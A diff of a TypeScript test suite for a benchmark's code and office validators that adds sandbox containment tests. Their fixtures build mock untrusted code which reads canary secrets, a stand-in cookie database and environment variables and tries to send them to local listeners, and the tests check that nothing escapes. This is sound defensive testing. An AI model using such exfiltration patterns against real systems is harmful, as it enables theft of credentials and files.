@@ -9,8 +9,8 @@
 
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { cpSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
-import { createServer } from "node:net";
+import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { createServer, type Server } from "node:net";
 import { tmpdir } from "node:os";
 import path from "node:path";
 import { after, describe, it } from "node:test";
@@ -21,8 +21,9 @@ import PptxGenJS from "pptxgenjs";
 import { FIXTURES_DIR, HIDDEN_DIR, REPO_ROOT } from "../bench/workflows/lib/fixtures";
 import type { CheckResult, ValidatorSpec } from "../bench/workflows/lib/types";
 import { runValidator, type ValidationContext } from "../bench/workflows/lib/validators";
-import { CODE_TIMEOUT_MS, detectNetworkIsolation, validateCodeTests, type CodeContext } from "../bench/workflows/lib/validators/code";
+import { CODE_TIMEOUT_MS, nodeHardeningFlags, validateCodeTests, type CodeContext } from "../bench/workflows/lib/validators/code";
 import { findSoffice } from "../bench/workflows/lib/validators/office";
+import { detectSandbox, nodeBinary, runSandboxed } from "../bench/workflows/lib/validators/sandbox";
 import { validateRubric } from "../bench/workflows/lib/validators/rubric";
 import { detectLanguage, meetingsViolations, rangeCovers } from "../bench/workflows/lib/validators/text";
 import { parseSse, textFromFrames } from "../bench/workflows/lib/validators/trace";
@@ -311,17 +312,48 @@ describe("citations", () => {
   });
 });
 
+const sandboxed = detectSandbox().available;
+const needsSandbox = sandboxed ? false : `no sandbox here: ${(detectSandbox() as { reason?: string }).reason}`;
+
+/** A host-side listener (TCP on the loopback, or a Unix socket by path) that records whatever reaches it. */
+async function listener(socketPath?: string) {
+  const seen: string[] = [];
+  const server: Server = createServer((socket) => {
+    socket.unref();
+    seen.push("connection");
+    socket.on("data", (chunk) => seen.push(chunk.toString("utf8")));
+    socket.on("error", () => {});
+  });
+  await new Promise<void>((resolve) => (socketPath ? server.listen(socketPath, () => resolve()) : server.listen(0, "127.0.0.1", () => resolve())));
+  // A failed assertion skips drain(); unref keeps a leaked listener from holding the test process open.
+  server.unref();
+  const port = socketPath ? 0 : (server.address() as { port: number }).port;
+  // spawnSync blocks this event loop; whatever reached the socket is read after it returns.
+  const drain = async () => {
+    await new Promise((resolve) => setTimeout(resolve, 400));
+    await new Promise<void>((resolve) => server.close(() => resolve()));
+    return seen.join("");
+  };
+  return { port, drain };
+}
+
+function canary() {
+  const dir = outputs();
+  const file = path.join(dir, "outside-secret.txt");
+  writeFileSync(file, "TOP-SECRET-CANARY-123");
+  return file;
+}
+
 describe("code tests", () => {
-  // Fixture code is trusted, so where this machine has no network isolation
-  // the accept/reject tests may run it with filesystem limits only. The
-  // containment tests below never use that escape hatch.
-  const isolated = detectNetworkIsolation() !== null;
+  // Fixture code is trusted, so where this machine cannot build the sandbox
+  // the accept/reject tests may run it unsandboxed. The containment tests
+  // below never use that escape hatch.
   const codeCtx = (outputsDir: string, over: Partial<CodeContext> = {}): CodeContext => ({
     outputsDir,
     fixturesDir: FIXTURES_DIR,
     hiddenDir: HIDDEN_DIR,
     scratchDir: outputs(),
-    unsafeNoIsolation: !isolated,
+    unsafeNoSandbox: !sandboxed,
     ...over,
   });
   function project(fix: (ledger: string) => string, weaken = false, csv?: string) {
@@ -399,44 +431,35 @@ describe("code tests", () => {
   });
 
   // ── Containment: delivered code is untrusted ───────────────────────────────
-  async function listener() {
-    const seen: string[] = [];
-    const server = createServer((socket) => {
-      seen.push("connection");
-      socket.on("data", (chunk) => seen.push(chunk.toString("utf8")));
-      socket.on("error", () => {});
-    });
-    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
-    const port = (server.address() as { port: number }).port;
-    // spawnSync blocks this event loop; whatever reached the socket is read after it returns.
-    const drain = async () => {
-      await new Promise((resolve) => setTimeout(resolve, 400));
-      await new Promise<void>((resolve) => server.close(() => resolve()));
-      return seen.join("");
-    };
-    return { port, drain };
-  }
-  function canary() {
-    const dir = outputs();
-    const file = path.join(dir, "outside-secret.txt");
-    writeFileSync(file, "TOP-SECRET-CANARY-123");
-    return file;
-  }
-  /** Delivered code that reads `target` and POSTs it to the listener, then the correct fix. */
-  const exfiltrating = (target: string, port: number) => (src: string) =>
-    `import { readFileSync as __read } from "node:fs";\n` +
-    `let __loot = "nothing";\n` +
-    `try { __loot = __read(${JSON.stringify(target)}, "utf8"); } catch (e) { __loot = "denied:" + e.code; }\n` +
-    `try { await fetch("http://127.0.0.1:${port}/x", { method: "POST", body: __loot, signal: AbortSignal.timeout(2000) }); } catch {}\n` +
+  /**
+   * Delivered code: `payload` runs first (top-level await allowed) and leaves
+   * its findings in `__seen`; each finding is surfaced as a FAILING test
+   * named "seen <finding>", so it lands in the check detail. Then the
+   * correct fix, so nothing else fails.
+   */
+  const delivering = (payload: string) => (src: string) =>
+    `import __test from "node:test";\n` +
+    `const __seen = [];\n` +
+    `${payload}\n` +
+    `for (const s of __seen) __test("seen " + s, () => { throw new Error("surfaced"); });\n` +
     correct(src);
+  const exfiltrating = (target: string, port: number) =>
+    delivering(
+      `import { readFileSync as __read } from "node:fs";\n` +
+        `let __loot = "nothing";\n` +
+        `try { __loot = "read:" + __read(${JSON.stringify(target)}, "utf8"); } catch (e) { __loot = "denied:" + e.code; }\n` +
+        `__seen.push(__loot);\n` +
+        `try { await fetch("http://127.0.0.1:${port}/x", { method: "POST", body: __loot, signal: AbortSignal.timeout(2000) }); __seen.push("post:sent"); } catch (e) { __seen.push("post:" + (e.cause?.code ?? e.name)); }`
+    );
+  const seen = (checks: CheckResult[]) => checks.find((c) => c.id.endsWith(":tests"))?.detail ?? "";
 
-  it("a symlink in the delivered project is refused before anything is read or run, and nothing leaves", { skip: isolated ? false : "needs unshare -rn" }, async () => {
+  it("a symlink in the delivered project is refused before anything is read or run, and nothing leaves", { skip: needsSandbox }, async () => {
     const secret = canary();
     const { port, drain } = await listener();
     const dir = project(exfiltrating("./leak.txt", port));
     // The relative read above resolves against the test's cwd (the scratch copy).
     symlinkSync(secret, path.join(dir, "project/leak.txt"));
-    const checks = validateCodeTests(spec, codeCtx(dir, { unsafeNoIsolation: false }));
+    const checks = validateCodeTests(spec, codeCtx(dir, { unsafeNoSandbox: false }));
     const links = checks.find((c) => c.id === "code:project:links");
     assert.equal(links?.status, "fail");
     assert.match(links!.detail, /symlink in delivered project/);
@@ -455,25 +478,144 @@ describe("code tests", () => {
     if (mk.status === 0) assert.ok(failed(validateCodeTests(spec, codeCtx(fifoDir)), ":links"));
   });
 
-  it("delivered code runs with no network: a direct read is denied and a POST to a host listener never arrives", { skip: isolated ? false : "needs unshare -rn" }, async () => {
+  it("a correct fix passes inside the sandbox, and says so", { skip: needsSandbox }, () => {
+    const tests = validateCodeTests(spec, codeCtx(project(correct), { unsafeNoSandbox: false })).find((c) => c.id.endsWith(":tests"));
+    assert.equal(tests?.status, "pass", JSON.stringify(tests));
+    assert.match(tests!.detail, /sandboxed: own filesystem view, no network/);
+  });
+
+  it("a direct read of a host file is denied and a POST to a host listener never arrives", { skip: needsSandbox }, async () => {
     const secret = canary();
     const { port, drain } = await listener();
-    const checks = validateCodeTests(spec, codeCtx(project(exfiltrating(secret, port)), { unsafeNoIsolation: false }));
-    const tests = checks.find((c) => c.id.endsWith(":tests"));
-    assert.equal(tests?.status, "pass", JSON.stringify(checks));
-    assert.match(tests!.detail, /network-isolated/);
+    const detail = seen(validateCodeTests(spec, codeCtx(project(exfiltrating(secret, port)), { unsafeNoSandbox: false })));
+    assert.match(detail, /seen denied:ERR_ACCESS_DENIED/, detail);
+    assert.doesNotMatch(detail, /TOP-SECRET|post:sent/, detail);
     assert.equal(await drain(), "", "no egress");
   });
 
-  it("without network isolation the code is not executed (not_run), unless --unsafe-code", async () => {
+  it("a Unix socket on the host, reached by path, receives nothing (it does not exist inside)", { skip: needsSandbox }, async () => {
+    const socketPath = path.join(outputs(), "host.sock");
+    const { drain } = await listener(socketPath);
+    const payload =
+      `import { connect as __connect } from "node:net";\n` +
+      `__seen.push("unix:" + await new Promise((resolve) => {\n` +
+      `  const c = __connect({ path: ${JSON.stringify(socketPath)} }, () => { c.write("UNIX-PATH-EGRESS " + JSON.stringify(process.env)); c.end(); resolve("connected"); });\n` +
+      `  c.on("error", (e) => resolve(e.code));\n` +
+      `  setTimeout(() => resolve("timeout"), 2000);\n` +
+      `}));`;
+    const detail = seen(validateCodeTests(spec, codeCtx(project(delivering(payload)), { unsafeNoSandbox: false })));
+    assert.match(detail, /seen unix:ENOENT/, detail);
+    assert.equal(await drain(), "", "nothing reached the host socket");
+  });
+
+  it("node:sqlite (which ignores the permission model) can neither read nor create a file outside the copy", { skip: needsSandbox }, () => {
+    const outside = outputs();
+    const victim = path.join(outside, "cookies.sqlite");
+    // A stand-in for a browser cookie store; written as SQLite by the host's own node:sqlite where available.
+    const make = spawnSync(process.execPath, ["-e", `const { DatabaseSync } = require("node:sqlite"); const d = new DatabaseSync(${JSON.stringify(victim)}); d.exec("create table c(v); insert into c values ('SECRET-SESSION-777')"); d.close();`], { encoding: "utf8" });
+    const dropped = path.join(outside, "dropped-by-delivered-code.db");
+    const payload =
+      `try {\n` +
+      `  const { DatabaseSync: __D } = await import("node:sqlite");\n` +
+      `  try { __seen.push("sqlite-read:" + new __D(${JSON.stringify(victim)}, { readOnly: true }).prepare("select v from c").get().v); } catch (e) { __seen.push("sqlite-read-denied:" + (e.code ?? e.message)); }\n` +
+      `  try { new __D(${JSON.stringify(dropped)}).exec("create table pwn(x)"); __seen.push("sqlite-write:done"); } catch (e) { __seen.push("sqlite-write-denied:" + (e.code ?? e.message)); }\n` +
+      `} catch (e) { __seen.push("sqlite-unavailable:" + e.code); }`;
+    const detail = seen(validateCodeTests(spec, codeCtx(project(delivering(payload)), { unsafeNoSandbox: false })));
+    assert.doesNotMatch(detail, /SECRET-SESSION|sqlite-write:done/, detail);
+    assert.equal(existsSync(dropped), false, "no file created outside the copy");
+    if (nodeHardeningFlags().length) assert.match(detail, /seen sqlite-unavailable:ERR_UNKNOWN_BUILTIN_MODULE/, detail);
+    if (make.status !== 0) assert.match(detail, /seen sqlite-/, detail);
+  });
+
+  it("without a sandbox the code is not executed (not_run), unless --unsafe-code", async () => {
     const { port, drain } = await listener();
-    const checks = validateCodeTests(spec, codeCtx(project(exfiltrating("/nonexistent", port)), { isolation: null, unsafeNoIsolation: false }));
+    const checks = validateCodeTests(spec, codeCtx(project(exfiltrating("/nonexistent", port)), { sandbox: false, unsafeNoSandbox: false }));
     const tests = checks.find((c) => c.id.endsWith(":tests"));
     assert.equal(tests?.status, "not_run");
-    assert.match(tests!.detail, /not executed.*unshare -rn.*--unsafe-code/);
+    assert.match(tests!.detail, /not executed: no sandbox here.*--unsafe-code.*not a security boundary/);
     assert.equal(await drain(), "", "nothing ran, so nothing was sent");
-    const unsafe = validateCodeTests(spec, codeCtx(project(correct), { isolation: null, unsafeNoIsolation: true }));
-    assert.match(unsafe.find((c) => c.id.endsWith(":tests"))!.detail, /UNSAFE: network NOT isolated/);
+    const unsafe = validateCodeTests(spec, codeCtx(project(correct), { sandbox: false, unsafeNoSandbox: true }));
+    assert.match(unsafe.find((c) => c.id.endsWith(":tests"))!.detail, /UNSAFE: not sandboxed \(--unsafe-code\)/);
+  });
+});
+
+describe("the sandbox itself (no Node permission model, node:sqlite left on)", () => {
+  // These run node directly in the sandbox WITHOUT --permission, so they show
+  // the namespace sandbox containing code on its own, as if the permission
+  // model had been bypassed.
+  it("host files, host Unix sockets, SQLite outside the paths, writes and the network are all out of reach", { skip: needsSandbox }, async () => {
+    const work = outputs();
+    const outside = outputs();
+    const secret = path.join(outside, "secret.txt");
+    writeFileSync(secret, "TOP-SECRET-CANARY-456");
+    const victim = path.join(outside, "app.sqlite");
+    spawnSync(process.execPath, ["-e", `const { DatabaseSync } = require("node:sqlite"); const d = new DatabaseSync(${JSON.stringify(victim)}); d.exec("create table t(v); insert into t values ('SECRET-ROW-888')"); d.close();`]);
+    const dropped = path.join(outside, "dropped.db");
+    const socketPath = path.join(outside, "host.sock");
+    const unix = await listener(socketPath);
+    const tcp = await listener();
+    writeFileSync(
+      path.join(work, "probe.mjs"),
+      `import fs from "node:fs";
+import net from "node:net";
+const r = {};
+const attempt = async (k, f) => { try { r[k] = "ok:" + String(await f()).slice(0, 40); } catch (e) { r[k] = "err:" + (e.code ?? e.cause?.code ?? e.name); } };
+await attempt("read", () => fs.readFileSync(${JSON.stringify(secret)}, "utf8"));
+await attempt("home", () => fs.readdirSync(${JSON.stringify(process.env.HOME ?? "/root")}).length);
+await attempt("writeWork", () => fs.writeFileSync("x.txt", "x"));
+await attempt("writeOutside", () => fs.writeFileSync(${JSON.stringify(path.join(outside, "w.txt"))}, "x"));
+await attempt("unix", () => new Promise((res, rej) => { const c = net.connect({ path: ${JSON.stringify(socketPath)} }, () => { c.end("UNIX-EGRESS"); res("connected"); }); c.on("error", rej); }));
+await attempt("tcp", () => fetch("http://127.0.0.1:${tcp.port}/x", { method: "POST", body: "TCP-EGRESS", signal: AbortSignal.timeout(2000) }).then((x) => x.status));
+await attempt("sqliteRead", async () => { const { DatabaseSync } = await import("node:sqlite"); return new DatabaseSync(${JSON.stringify(victim)}, { readOnly: true }).prepare("select v from t").get().v; });
+await attempt("sqliteWrite", async () => { const { DatabaseSync } = await import("node:sqlite"); new DatabaseSync(${JSON.stringify(dropped)}).exec("create table p(x)"); return "created"; });
+r.root = fs.readdirSync("/").sort().join(",");
+r.pid = process.pid;
+process.stdout.write(JSON.stringify(r));
+`
+    );
+    const node = nodeBinary();
+    const run = runSandboxed(node, ["probe.mjs"], { readOnly: [work, node], cwd: work }, { encoding: "utf8", timeout: 20_000, killSignal: "SIGKILL", env: { PATH: process.env.PATH ?? "" } });
+    assert.equal(run.status, 0, run.stderr);
+    const r = JSON.parse(run.stdout) as Record<string, string | number>;
+    assert.equal(r.read, "err:ENOENT", JSON.stringify(r));
+    assert.equal(r.home, "err:ENOENT", JSON.stringify(r));
+    assert.equal(r.writeWork, "err:EROFS", JSON.stringify(r));
+    assert.match(String(r.writeOutside), /^err:(ENOENT|EROFS)$/, JSON.stringify(r));
+    assert.equal(r.unix, "err:ENOENT", JSON.stringify(r));
+    assert.match(String(r.tcp), /^err:/, JSON.stringify(r));
+    assert.match(String(r.sqliteRead), /^err:/, JSON.stringify(r));
+    assert.match(String(r.sqliteWrite), /^err:/, JSON.stringify(r));
+    assert.equal(r.pid, 1, "its own PID namespace");
+    const top = String(r.root).split(",");
+    for (const hostOnly of ["home", "root", "run", "var", "srv", "mnt"]) assert.ok(!top.includes(hostOnly), `/${hostOnly} visible: ${r.root}`);
+    assert.equal(existsSync(dropped), false);
+    assert.equal(existsSync(path.join(outside, "w.txt")), false);
+    assert.equal(existsSync(path.join(work, "x.txt")), false);
+    assert.equal(await unix.drain(), "", "nothing reached the host Unix socket");
+    assert.equal(await tcp.drain(), "", "nothing reached the host loopback");
+  });
+
+  it("a timed-out child is killed with its whole sandbox, leaving no process behind", { skip: needsSandbox }, () => {
+    const work = outputs();
+    writeFileSync(path.join(work, "spin.js"), "process.on('SIGTERM', () => {}); for (;;) {}");
+    const node = nodeBinary();
+    const started = Date.now();
+    try {
+      const run = runSandboxed(node, [path.join(work, "spin.js"), work], { readOnly: [work, node], cwd: work }, { encoding: "utf8", timeout: 1_500, killSignal: "SIGKILL", env: { PATH: process.env.PATH ?? "" } });
+      assert.equal((run.error as NodeJS.ErrnoException | undefined)?.code, "ETIMEDOUT");
+      assert.ok(Date.now() - started < 10_000);
+      spawnSync("sleep", ["0.5"]);
+      const left = spawnSync("pgrep", ["-f", work], { encoding: "utf8" });
+      if (left.error) return; // no pgrep here
+      assert.equal(left.stdout.trim(), "", `left running: ${left.stdout}`);
+    } finally {
+      spawnSync("pkill", ["-9", "-f", work]);
+    }
+  });
+
+  it("refuses relative or multi-line paths", () => {
+    assert.throws(() => runSandboxed("/bin/true", [], { readOnly: ["relative/dir"], cwd: "/" }, { encoding: "utf8" }), /absolute single-line/);
+    assert.throws(() => runSandboxed("/bin/true", [], { writable: ["/tmp/a\nb"], cwd: "/" }, { encoding: "utf8" }), /absolute single-line/);
   });
 });
 
@@ -630,10 +772,71 @@ describe("one_of and office reopen", () => {
   });
 });
 
+describe("office reopen containment (a stand-in soffice that reports what it can reach)", () => {
+  /**
+   * A fake LibreOffice laid out like a real install (<root>/program/soffice).
+   * It prints what it can see and exits 1, so the validator's fail detail
+   * carries its report. The host canary sits outside the install root.
+   */
+  function fakeSoffice() {
+    const base = outputs();
+    const marker = path.join(base, "soffice-ran.txt");
+    const hostCanary = path.join(base, "host-canary.txt");
+    writeFileSync(hostCanary, "TOP-SECRET-CANARY-789");
+    const program = path.join(base, "fake-lo", "program");
+    mkdirSync(program, { recursive: true });
+    const soffice = path.join(program, "soffice");
+    writeFileSync(
+      soffice,
+      [
+        "#!/bin/sh",
+        `: > ${JSON.stringify(marker)} 2>/dev/null && M=wrote || M=denied`,
+        `test -e ${JSON.stringify(hostCanary)} && C=visible || C=absent`,
+        `echo "REPORT key=\${WB_FAKE_PROVIDER_KEY:-unset} home=$HOME canary=$C marker=$M"`,
+        "exit 1",
+        "",
+      ].join("\n")
+    );
+    chmodSync(soffice, 0o755);
+    return { soffice, marker };
+  }
+  const memo = () => {
+    const dir = outputs();
+    writeFileSync(path.join(dir, "memo.docx"), "PK stand-in");
+    return dir;
+  };
+  const spec: ValidatorSpec = { kind: "office_reopen", file: "memo.docx", format: "docx" };
+  const previousKey = process.env.WB_FAKE_PROVIDER_KEY;
+  after(() => (previousKey === undefined ? delete process.env.WB_FAKE_PROVIDER_KEY : (process.env.WB_FAKE_PROVIDER_KEY = previousKey)));
+
+  it("soffice runs sandboxed with a minimal environment: no operator secrets, no host files, no writes outside its scratch", { skip: needsSandbox }, async () => {
+    process.env.WB_FAKE_PROVIDER_KEY = "sk-should-never-reach-soffice";
+    const { soffice, marker } = fakeSoffice();
+    const checks = await run(spec, memo(), { officeReopen: true, soffice, unsafeOffice: false });
+    assert.deepEqual(statuses(checks), ["fail"], JSON.stringify(checks));
+    assert.match(checks[0].detail, /REPORT key=unset home=\S*\/lo-\w+ canary=absent /, checks[0].detail);
+    // Its write landed, if anywhere, in the sandbox's private /tmp, which is gone now.
+    assert.equal(existsSync(marker), false, "nothing written on the host");
+  });
+
+  it("without a sandbox the file is not opened (not_run), unless --unsafe-office, which still gets the minimal environment", async () => {
+    process.env.WB_FAKE_PROVIDER_KEY = "sk-should-never-reach-soffice";
+    const { soffice, marker } = fakeSoffice();
+    const refused = await run(spec, memo(), { officeReopen: true, soffice, sandbox: false, unsafeOffice: false });
+    assert.deepEqual(statuses(refused), ["not_run"], JSON.stringify(refused));
+    assert.match(refused[0].detail, /not opened in LibreOffice: no sandbox here.*--unsafe-office/);
+    assert.equal(existsSync(marker), false, "soffice never started");
+    const unsafe = await run(spec, memo(), { officeReopen: true, soffice, sandbox: false, unsafeOffice: true });
+    // Unsandboxed it can reach the host (that is what --unsafe-office means), but not the operator's keys.
+    assert.match(unsafe[0].detail, /REPORT key=unset .*canary=visible marker=wrote/, unsafe[0].detail);
+  });
+});
+
 describe("office reopen with LibreOffice", () => {
   const soffice = findSoffice();
   const skip = soffice ? false : "LibreOffice (soffice) is not installed here";
-  const reopen = (spec: ValidatorSpec, dir: string) => run(spec, dir, { officeReopen: true, soffice });
+  // The test documents are trusted, so where no sandbox can be built these may open them unsandboxed.
+  const reopen = (spec: ValidatorSpec, dir: string) => run(spec, dir, { officeReopen: true, soffice, unsafeOffice: !sandboxed });
   const docx = () =>
     Packer.toBuffer(new Document({ sections: [{ children: [new Paragraph({ text: "Decision", heading: HeadingLevel.HEADING_1 }), new Paragraph("Maya owns the EUR 2,400 follow-up.")] }] }));
   async function book(cached: number) {
